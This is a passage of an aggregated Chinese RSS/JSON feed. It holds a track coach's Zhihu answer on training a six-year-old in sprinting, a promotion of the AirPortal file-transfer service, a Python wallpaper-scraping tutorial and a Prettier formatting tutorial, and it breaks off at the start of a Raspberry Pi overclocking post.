class=\"internal\">历史上有哪些精心布局却被对方一下破局的故事？</a></li>\n<li><a href=\"https://www.zhihu.com/question/20403477/answer/712635036\" class=\"internal\">110 米栏的顶级运动员，为什么他们不参加100米的比赛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/302684797/answer/544389984\" class=\"internal\">男生100m跑到11s很奇怪嘛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/282601379/answer/528371413\" class=\"internal\">跑150米然后截取速度最快的连续100米区间作为100米的成绩是否更合理？</a></li>\n<li><a href=\"https://www.zhihu.com/question/352385663/answer/884879335\" class=\"internal\">为什么马拉松选手最后不冲刺？</a></li>\n<li><a href=\"https://www.zhihu.com/question/39239070/answer/594491009\" class=\"internal\">体育赛事中有哪些「几乎不可破」的纪录？</a></li>\n<li><a href=\"https://www.zhihu.com/question/24987243/answer/1357448925\" class=\"internal\">跑5公里需要多少分钟？</a></li>\n<li><a href=\"https://www.zhihu.com/question/407047274/answer/1363793504\" class=\"internal\">很多退役的军人都说自己五公里可以15/16分，军队的训练真的这么强么？</a></li>\n<li><a href=\"https://www.zhihu.com/question/24987243/answer/1357448925\" class=\"internal\">为什么田径室外百米记录要比室内百米记录快？</a></li>\n</ul>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/yun-dong-fen-zi-cheng-lan-wen-hua?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">运动分子</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/474850082/answer/2026108063?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">122 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/30252383?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">近视眼对玩射击或者射箭运动的障碍大吗？</a><br><a href=\"http://www.zhihu.com/question/345087864?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">高中女生左眼近视625右眼近视675能否参加运动会100米短跑？</a><br>\n","link":"http://www.zhihu.com/question/474850082/answer/2026108063?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"6 岁的孩子说想学跑步，成为像苏炳添那样的运动员，作为家长该如何培养？","date":"2021-08-02 03:45:08","description":"\n<p>田径出身的一名大学田径队教练来谈一谈我的看法，希望有所借鉴。</p>\n<p>我先从专业的角度，来给一些解答。</p>\n<h2>7-14岁是孩子速度发展的一个窗口期</h2>\n<p>人的身体素质，包括速度、力量、耐力、灵敏、平衡等，在不同的年龄段，都会有发展比较迅速或缓慢的时候，当然儿童处在成长期，身体各指标都会快速增长，但总有增长尤为突出的某项指标，我们把这段快速增长的一段时期，称为快速发展的“窗口期”。</p>\n<p>为什么小学会把快速跑当成一个衡量身体素质的重要指标呢？就是因此此年龄段，正好处在孩子速度快速发展的阶段，在这个阶段有意识地培养孩子的速度，提升孩子的爆发力，就会事半功倍。</p>\n<p>作为一名田径运动员、教练，苏炳添能够以打破亚洲纪录记录的成绩闯进奥运会男子100米决赛，成为第一个站在飞人赛道的黄种人，我由衷感到自豪！这个时候，如果孩子热爱体育，有这样的信念支撑他，有这么一个强有力的偶像光环作为他的榜样，作为父母，我给的建议是：</p>\n<p><b>支持他，从心理和实际行动上，给他鼓励和帮助！</b></p>\n<p><b>因为我深知，扎根一个梦想的种子，对于一个满怀激情的孩子来说，是无比重要！而此时父母给予的帮助对孩子来说，定会弥足珍贵！</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-96c0e546fd86fab8e1ef5412b8270e58_720w.jpg?rss\" data-rawwidth=\"2428\" data-rawheight=\"1358\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-96c0e546fd86fab8e1ef5412b8270e58\" data-watermark-src=\"v2-0c8f2561dccc838fad0ffff2f2d7ff93\" data-private-watermark-src=\"v2-1f6e03bacaa0a6f6ef6a5961346576d0\"></p>\n<p>作为父母，孩子的监护人，看着子女健康成长，衣食无忧，建功立业，结婚生子，是我们所愿所想。但培养他们良好的行为习惯，磨炼他们坚强的意志品质，遵守社会公德和法律，是父母的职责所在，此外，我们还希望在顺境中为其欢欣鼓舞，逆境中支持鼓励，给他们心中埋下一粒种子，为他们的梦想保驾护航。</p>\n<p>那么6岁的孩子究竟是否合适？在这些练习过程中又要注意什么呢？父母又要做什么呢？不要着急，请听我一一解答。</p>\n<h2>田径是一切运动的基础</h2>\n<p>请允许我\"王婆卖瓜\"一番，田径是运动之母，我们自打出生起，就跟田径运动分不开。走、跑、跳、投等，融入到我们的生活方方面面。<b>6岁的孩子即将进入发展速度的窗口期，因此在此时学习跑步，是一项非常明智的选择，对于提升孩子的整体素质，大有裨益。</b>不论是否今后从事体育项目，都会让孩子收益。当然如果今后发现天赋异禀，转成其他专业，相信田径带来的益处，绝对会让孩子受益匪浅。</p>\n<p><br></p>\n<p>俗话说的好，“兴趣是最好的老师”。孩子有了明确的偶像，有了学的兴趣，可谓有了“人和”。此时又是孩子练习短跑提升速度的窗口期，正所谓拥有了“天时”，那么这个“地利”，究竟如何获得呢？也就是我下面要讲的练什么，以及怎么练，以及练习过程中的注意事项。</p>\n<h2>身体锻炼一定要符合孩子身心发展</h2>\n<p>练什么怎么练，主要依据还是儿童在此时期的生理特点及心理特点来决定。孩子在6岁时，活泼爱动是天性，喜欢追赶打闹。你会发现带娃出去玩的时候，他们喜欢跑跑就停下，没休息多久马上就到处跑的情况反复发生。到底是为什么呢？简单来讲，<b>小朋友就好比一个封不上口的气球</b>，气打多了就会爆掉，因此能量存储有限。释放能量时，因为封不上口，“呼”的一下就全放走了，所以他们就容易累。气没了，再打气，不一会儿，他们又活力满满了。</p>\n<p>基于儿童身心发展特点，在给小朋友安排短跑练习时，有几个原则。</p>\n<blockquote>\n<b>第一，少量多次。</b><br><b>第二，循序渐进。</b><br><b>第三，娱乐性强。</b><br><b>第四，目标明确。</b>\n</blockquote>\n<h3><b>Rule NO.1 少量多次</b></h3>\n<p>小朋友耐力差，因此单次跑步的练习，距离一定不要长，控制好运动量。在每个单元的训练，合理规划好热身、练习时间、休息时间、放松，并且在休息时要注意补水和补充能量。多次，是因为儿童恢复能力好，可以在短暂休息后，再继续进行下一次练习。</p>\n<p>比如，我们在一堂40分钟的训练课中，可以给儿童安排10分钟的热身，热身时可进行慢跑或者做一些跟跑动有关的游戏，带着小朋友活动头、肩、髋、膝、踝各个关节，拉伸手臂和腿部肌肉，达到热身目的。25分钟的正课时间里，安排3组20米跑，组间休息1-2分钟，3组50米跑，组间休息2-3分钟。20米完成后，可增加休息时间，再进行50米练习。最后5分钟用来整理和放松，重点进行大、小腿的拉伸和背部的伸展放松。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-8912ea1c3cc3782205098ceeff5ed43f_720w.jpg?rss\" data-rawwidth=\"1026\" data-rawheight=\"548\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-8912ea1c3cc3782205098ceeff5ed43f\" data-watermark-src=\"v2-15b887ec5b1ae845b7a789035753b55f\" data-private-watermark-src=\"v2-50024f195a572935e12d543711ea183a\"></p>\n<h3>Rule NO.2 循序渐进</h3>\n<p>即使有了偶像，自己有浓厚的兴趣，也要注意循序渐进。苏炳添将近32岁，历时3届奥运之旅才终于冲进决赛，我们也不可能一天两天，一年两年，就能有质的飞跃。<b>尤其是在成绩大幅增长的时候，更应该注意保护，不能猛进。</b>我当年跳高受伤，就是因为在3个月从1.70米长了20厘米，身体其他方面素质没有跟上，太过激进，才会受伤影响了后续成绩增长的。因此，循序渐进，在孩子已经适应了前一单元的量和强度后，才可以再增加。</p>\n<p>例如，在前一次安排的主要内容里，小朋友在3组20米，3组50米已经可以完成后，在递进的练习中，可以通过增加量或者增加强度，以及同时增加量和强度的形式进行变换组合。</p>\n<p>PlanA 建议在保证运动强度不变的前提下，先提高运动量。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-2e96f88f39e8d11bd9c4cd81320a4dec_720w.jpg?rss\" data-rawwidth=\"1012\" data-rawheight=\"554\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-2e96f88f39e8d11bd9c4cd81320a4dec\" data-watermark-src=\"v2-9a55b9b4834a383a6e86c1b909786f66\" data-private-watermark-src=\"v2-ae0c4494d14d53027caccc624df1b19e\"></p>\n<p>PlanB 完成A方案后，再在运动量不变的情况下，提高运动强度。因为小朋友没有经过系统训练，很难体会速度感，不了解90%的速度跑和100%全力冲刺的区别，因此我们可以通过缩短间歇时间来提高运动强度。但要注意20米和50米之间的间歇要保障，进行休息和补水。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-ca3b8640965669f06b2c28993544ef21_720w.jpg?rss\" data-rawwidth=\"1010\" data-rawheight=\"572\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-ca3b8640965669f06b2c28993544ef21\" data-watermark-src=\"v2-91de07b77e77fdde00f2ab18a37733fa\" data-private-watermark-src=\"v2-1cda9f216ad02f5c1855b7c9f1a1bb70\"></p>\n<p>PlanC 运动量和强度分别提升且适应后，再同时提高。这一单元的训练，对成绩的提升尤为重要，同样需要注意在20米结束后，保证充足的休息时间。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-7ad885ef5346ea4e8e1e4543bcde23ac_720w.jpg?rss\" data-rawwidth=\"1028\" data-rawheight=\"570\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-7ad885ef5346ea4e8e1e4543bcde23ac\" data-watermark-src=\"v2-9974145b54fd4a9aa7401b2024c33845\" data-private-watermark-src=\"v2-b75f1714d5343d75c1cdb736cb7c19d8\"></p>\n<p>根据儿童运动能力的提升和实际情况，组数、间歇时间，甚至是跑动距离都可以进行调整，这些计划和安排，都要因人而异，适时调整和改变。</p>\n<h3>Rule NO.3 娱乐性强</h3>\n<p>根据儿童心理发展特点，枯燥单一的练习，会让孩子失去兴趣。因此娱乐性就显得尤为重要。我们可以通过改变形式、方法，增加器材、设备等，提升孩子的兴趣，让看似枯燥的田径运动，也能发挥出它应有的魅力，让孩子在真正下定决心从事这项运动之前，仍然能够保有兴趣，让激情不被扼杀在摇篮里。<b>毕竟，真正的训练是非常苦的，每个奥运选手的成长之路，训练都是无比艰辛和刻苦，他们付出了常人无法想象的努力和心血。</b></p>\n<p>儿童在这个年龄，不仅仅是单一的直线跑。可以设定标志点，比如多种形式的折返跑、比如多人追逐跑（从前最常见的老鹰抓小鸡、撕名牌等）、配合道具的模仿救护员、消防员营救等多种形式，持球或其他物品的传递或亲子接力等，都可以融入进来，让孩子在提升速度练习的同时，觉得好玩并愿意坚持下去。</p>\n<p>去年冬天我带着小萌利用标志点进行了一些速度练习，可以跟各位分享几种方式方法。</p>\n<a href=\"https://www.zhihu.com/zvideo/1405368268631220224\">萌爸Kyle-标志点的速度练习</a><h3>Rule NO.4 目标明确</h3>\n<p>目标明确孩子执行力才更强。要有长期目标和短期目标。长期目标要有大的方向，尤其如果今后是奔着职业运动员发展的，要有一个大概的时间点，在此之前需要提升的专项素质和身体素质，都要达到要求才可以。短期目标要实际可操作付出努力后能达到，小到一次训练中孩子需要跑的距离，次数、时间等，都要有制定，这样孩子才会有动力，训练之后达成目标才会有成就感，也会激励他再接再厉继续前行。</p>\n<p>我们不能仅仅能看到的成绩的快慢。循序渐进，扎实走好每一步，有明确的目标，经过艰苦训练，才是苏炳添最终登上荣耀舞台的法宝。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-27c0964e1a9badd2229e15ee3a0e13f6_720w.jpg?rss\" data-rawwidth=\"2400\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"苏炳添的名字印刻在奥运会男子100米飞人大战的战场\" data-watermark=\"watermark\" data-original-src=\"v2-27c0964e1a9badd2229e15ee3a0e13f6\" data-watermark-src=\"v2-7910049c7652a94ec5b7cba374a8ed58\" data-private-watermark-src=\"v2-3cec0b19dc1f69b662064b823b73d546\"></p>\n<p>作为一名田径教练员，我也会根据不同项目，在不同时间，给队员安排具体的训练计划，让队员有目标，有侧重点，可操作，能执行。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-3087386865d503c9f89cd2b85b6e039b_720w.jpg?rss\" data-rawwidth=\"970\" data-rawheight=\"1054\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-3087386865d503c9f89cd2b85b6e039b\" data-watermark-src=\"v2-4083ba3c14aa26a1bb0ae887f21abffe\" data-private-watermark-src=\"v2-563ea294176285689e12f85c051dd35b\"></p>\n<h2>父母到底应该做什么？怎样支持孩子呢？</h2>\n<p>6岁的儿童还处在身体发展阶段，作为一名专业的田径教练员，<b>我强烈反对过早的竞技化</b>。因此，<b>不要把孩子送进体校，也不要过早确定短跑这个项目！</b></p>\n<p>如果家长有条件，可以先给孩子试着报一些体能培训班，当然有些培训机构以赚钱为目的，教练的能力参差不齐，有的会为了“效果”，过早的榨干孩子的潜能，而单一发展学生的某一身体素质。</p>\n<p>这时候，如果能送到有田径队的学校（大学、中学、小学皆可）里让孩子跟着活动，或送到更专业的地方就再好不过，<b>一定要跟教练说明来意，并表明观点：让孩子跟着玩，但不能像专业运动员一样练。</b>这么做的目的，一方面进行练习时会正规、系统；另一方面，可以让教练观察一下孩子在这方面是否有天赋。</p>\n<p>毕竟，竞技体育的选材都是非常严苛的。如果过早开发，可能会让孩子失去冲击更好成绩的机会；但如果孩子没有天赋，也好及时转型，避免时间、精力的浪费。但不论是否走专业路线，让孩子从事体育锻炼，适度练习对身体有很大好处，有益且有效。父母在孩子没有独立判断事情的能力之前，帮助孩子做最合理的决策，出谋划策，为他们的梦想护航，让他们向着正确的方向稳步前行。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/meng-ba-kyle?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">萌爸Kyle</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/476569561/answer/2033431219?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">128 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/35348789?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">博尔特是不是人类体育史上最伟大的运动员？</a><br><a href=\"http://www.zhihu.com/question/20350644?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">博尔特能否被称作迄今为止最伟大的田径运动员？</a><br>\n","link":"http://www.zhihu.com/question/476569561/answer/2033431219?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何免费不限速传输文件？你应该试试 AirPortal！","date":"2021-07-30 10:50:00","description":"\n<p>微信传输限制 200M （电脑端 1GB），某度网盘的限速实在离谱。</p>\n<p>那么，如何快速、简单的传输文件呢？</p>\n<p>AirPortal 可以解决这个难题！</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E5%85%A8\" class=\"headerlink\" title=\"安全\"></a>安全</h2>\n<p>可以设置取件密码，在输入取件码的同时还要输入密码，进一步保护文件安全。</p>\n<p>可以设置下载次数，达到一定下载次数时自动从服务器上删除文件，无法下载。</p>\n<p>可以设置保存小时数，超过时间后自动从服务器上删除文件，无法下载。</p>\n<p>当用户多次输入错误的取件码时，将自动弹出验证码，核实是否为真实用户。</p>\n<img webp-comp src=\"https://bu.dusays.com/2021/07/30/c6da584dd68d5.png\"><h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E4%BE%BF%E5%BF%AB%E9%80%9F\" class=\"headerlink\" title=\"方便快速\"></a>方便快速</h2>\n<p>AirPortal 不限速，提供多地区服务器下载。</p>\n<img webp-comp src=\"https://bu.dusays.com/2021/07/30/2194e7359dab2.png\"><p>无论是否是高级用户，都将文件存储在 OSS，提高服务可用性与下载速度。</p>\n<p>无需多余的步骤，打开客户端或网页版输入取件码和密码（如有设置）就可以下载。</p>\n<p>在两台设备上登录同一个账号后，在其中任意一台设备上传文件，在另一台设备上会自动询问是否接收，无需输入取件码。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%85%8D%E7%99%BB%E5%BD%95%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"免登录使用\"></a>免登录使用</h3>\n<p>AirPortal 可以免登录使用，以下是一些限制：</p>\n<table>\n<thead><tr>\n<th align=\"center\">未登录</th>\n<th align=\"center\">免费</th>\n<th align=\"center\">高级</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\">无限流量</td>\n<td align=\"center\">无限流量</td>\n<td align=\"center\">10GB + 结余</td>\n</tr>\n<tr>\n<td align=\"center\">单次上传 1GB</td>\n<td align=\"center\">单次上传 2GB</td>\n<td align=\"center\">无限</td>\n</tr>\n</tbody>\n</table>\n<img webp-comp src=\"https://bu.dusays.com/2021/07/30/1b7b87e798158.png\"><h3>\n<a href=\"https://blog.yfun.top/#%E7%AE%80%E6%B4%81%E7%9A%84%E9%A1%B5%E9%9D%A2\" class=\"headerlink\" title=\"简洁的页面\"></a>简洁的页面</h3>\n<p>没有花里胡哨的广告和弹窗，简洁明了，点击「发送」就可以发送文件或文字。</p>\n<img webp-comp src=\"https://bu.dusays.com/2021/07/30/3aa77007547f5.png\"><h3>\n<a href=\"https://blog.yfun.top/#Wi-Fi-%E5%BF%AB%E4%BC%A0\" class=\"headerlink\" title=\"Wi-Fi 快传\"></a>Wi-Fi 快传</h3>\n<p>在同一局域网下，使用客户端开启「Wi-Fi 快传」功能，文件传输不经过热铁盒服务器与公网，更快速，更安全。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%89%AA%E8%B4%B4%E6%9D%BF%E5%85%B1%E4%BA%AB\" class=\"headerlink\" title=\"剪贴板共享\"></a>剪贴板共享</h3>\n<p>基于 Wi-Fi 快传的剪贴板共享功能，可以轻松实现跨设备复制粘贴，零延迟，支持多种操作系统。</p>\n<p>（需要同时打开客户端并连接 Wi-Fi 快传，iOS 端将会以文本方式同步到客户端）</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%A4%9A%E5%B9%B3%E5%8F%B0\" class=\"headerlink\" title=\"多平台\"></a>多平台</h2>\n<p>拥有 iOS, 安卓, Windows, macOS 与 Linux 平台的客户端，其余平台也可以使用 网页端。</p>\n<p>官方网址：<a href=\"https://airportal.cn/\">https://airportal.cn/</a></p>\n<p>*: 感谢 AirPortal 空投的支持！</p> ","link":"https://blog.yfun.top/posts/2021/airportal/"},{"title":"使用 Python 爬取故宫壁纸","date":"2021-07-17 05:55:00","description":"\n<p>我非常喜欢故宫壁纸，但是一张一张下载的速度就太慢了。</p>\n<p>于是，我就写了个简单的 Python 小程序自动爬取故宫壁纸。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%A3%E7%A0%81\" class=\"headerlink\" title=\"代码\"></a>代码</h2>\n<p>首先，我们通过简单的查看，知道故宫壁纸的页面并没有使用 JavaScript 载入。</p>\n<p>但是故宫壁纸很多，所以还需要分类。</p>\n<p>故宫壁纸大多都是以分类开头，如 <code>爱上紫禁城 紫藤</code>, <code>清   虚谷紫藤金鱼图轴（局部）</code> 等等，所以一般只需要做个简单的 <code>startswith()</code> 判断就 OK 了。</p>\n<p>很多壁纸的标题都是一样的，所以还可以使用 <code>random</code> 库在文件名末尾追加一个随机数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests, bs4, time, random</span><br><span class=\"line\">path = <span class=\"string\">\"./wallpaper/爱上紫禁城\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">catch = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">119</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    url = <span class=\"string\">\"https://www.dpm.org.cn/lights/royal/p/{}.html\"</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">    <span class=\"comment\"># 发送请求</span></span><br><span class=\"line\">    response = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># 设定页面编码为 UTF-8</span></span><br><span class=\"line\">    response.encoding = <span class=\"string\">\"UTF-8\"</span></span><br><span class=\"line\">    <span class=\"comment\"># 从 HTML 中解析数据</span></span><br><span class=\"line\">    soup = bs4.BeautifulSoup(response.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">    image = soup.find_all(name=<span class=\"string\">\"div\"</span>, class_=<span class=\"string\">\"pic\"</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 循环输出图片</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> image:</span><br><span class=\"line\">        catch = catch + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"comment\"># 获得壁纸名称</span></span><br><span class=\"line\">        <span class=\"comment\"># 分类，不是以【爱上紫禁城】开头的壁纸都忽略</span></span><br><span class=\"line\">        img_name = n.a.img[<span class=\"string\">\"title\"</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> img_name.startswith(<span class=\"string\">\"明\"</span>):</span><br><span class=\"line\">            print(<span class=\"string\">\"{}. {}\"</span>.<span class=\"built_in\">format</span>(catch, n.a.img[<span class=\"string\">\"title\"</span>]))</span><br><span class=\"line\">            <span class=\"comment\"># 组合获得壁纸页面</span></span><br><span class=\"line\">            url_1080 = <span class=\"string\">\"https://www.dpm.org.cn\"</span> + n.a[<span class=\"string\">\"href\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 请求高清版网页</span></span><br><span class=\"line\">            response_img = requests.get(url_1080)</span><br><span class=\"line\">            <span class=\"comment\"># 再次解析</span></span><br><span class=\"line\">            soup_img = bs4.BeautifulSoup(response_img.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 获取页面中的图片</span></span><br><span class=\"line\">            data = soup_img.find_all(name=<span class=\"string\">\"img\"</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 获得壁纸图片的链接</span></span><br><span class=\"line\">            img_url = data[<span class=\"string\">\"src\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 保存图片</span></span><br><span class=\"line\">            pic = requests.get(img_url).content</span><br><span class=\"line\">            file_name = path + img_name + <span class=\"string\">\"-\"</span> + <span class=\"built_in\">str</span>(random.randint(<span class=\"number\">100000</span>, <span class=\"number\">999999</span>)) + <span class=\"string\">\".jpg\"</span></span><br><span class=\"line\">            <span class=\"comment\"># 写入文件</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_name, <span class=\"string\">\"wb\"</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">                file.write(pic)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"!Ignore: \"</span> + img_name)</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>我把一些我下载下来的壁纸放在了 <a href=\"https://t.yfun.top/dpm-wallpaper\">这里</a>，可以直接预览并下载。</p>\n<p><del>OK，又水了一篇文（</del></p>\n","link":"https://blog.yfun.top/posts/2021/dpm-wallpaper/"},{"title":"使用 Prettier 格式化代码","date":"2021-07-15 06:45:00","description":"\n<p>格式化代码可以提高代码的可读性，使代码更加美观。</p>\n<p>Prettier 支持：</p>\n<ul>\n<li>JavaScript (including experimental features)</li>\n<li>JSX</li>\n<li>Angular</li>\n<li>Vue</li>\n<li>Flow</li>\n<li>TypeScript</li>\n<li>CSS, Less, and SCSS</li>\n<li>HTML</li>\n<li>JSON</li>\n<li>GraphQL</li>\n<li>Markdown, including GFM and MDX</li>\n<li>YAML</li>\n</ul>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%8F%92%E4%BB%B6\" class=\"headerlink\" title=\"插件\"></a>插件</h3>\n<p>你可以很方便的在 VSCode 等 IDE 上安装插件，插件名为 <code>Prettier</code>.</p>\n<p>以 VSCode 为例：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/6a3ad0ea42d55.png\"></p>\n<blockquote><p>如果安装了其他格式化插件，则需要点击 [格式化文档的方式]，选择 <code>Prettier</code>。</p></blockquote>\n<h3>\n<a href=\"https://blog.yfun.top/#CLI\" class=\"headerlink\" title=\"CLI\"></a>CLI</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm i -g prettier</span><br></pre></td></tr></table></figure><p>相关的文档可参见官网: <a href=\"https://prettier.io/docs/en/cli.html\">https://prettier.io/docs/en/cli.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">prettier --write . <span class=\"comment\"># 格式化当前文件夹的所有文件</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%85%8D%E7%BD%AE\" class=\"headerlink\" title=\"配置\"></a>配置</h2>\n<p>参见官方文档：</p>\n<ul>\n<li><p><a href=\"https://prettier.io/docs/en/configuration.html\">https://prettier.io/docs/en/configuration.html</a></p></li>\n<li><p><a href=\"https://prettier.io/docs/en/options.html\">https://prettier.io/docs/en/options.html</a></p></li>\n</ul>\n<p>Prettier 的配置文件有多种写法：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/a4cc583d84c12.png\"></p>\n<p>以使用 <code>YAML</code> 书写的 <code>.prettierrc</code> 为例：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 单行最长字符数</span></span><br><span class=\"line\"><span class=\"attr\">printWidth:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"comment\"># 制表符长度</span></span><br><span class=\"line\"><span class=\"attr\">tabWidth:</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"comment\"># 是否使用 Tab</span></span><br><span class=\"line\"><span class=\"attr\">useTabs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># 是否加入分号</span></span><br><span class=\"line\"><span class=\"attr\">semi:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 单引号</span></span><br><span class=\"line\"><span class=\"attr\">singleQuote:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E6%95%88%E6%9E%9C\" class=\"headerlink\" title=\"效果\"></a>效果</h2>\n<p>格式化前：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>).then(<span class=\"function\"><span class=\"params\">res</span>=&gt;</span>res.json()).then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {<span class=\"built_in\">console</span>.log(content);<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++){<span class=\"built_in\">console</span>.log(content[i][<span class=\"string\">'title'</span>] + <span class=\"string\">\" --- https://blog.yfun.top\"</span> + content[i][<span class=\"string\">'url'</span>])}})</span><br></pre></td></tr></table></figure><p>格式化后：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>)</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> res.json())</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(content);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++) {</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">                content[i][<span class=\"string\">\"title\"</span>] +</span><br><span class=\"line\">                    <span class=\"string\">\" --- https://blog.yfun.top\"</span> +</span><br><span class=\"line\">                    content[i][<span class=\"string\">\"url\"</span>]</span><br><span class=\"line\">            );</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2021/format-code-using-prettier/"},{"title":"树莓派超频","date":"2021-06-25 07:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">     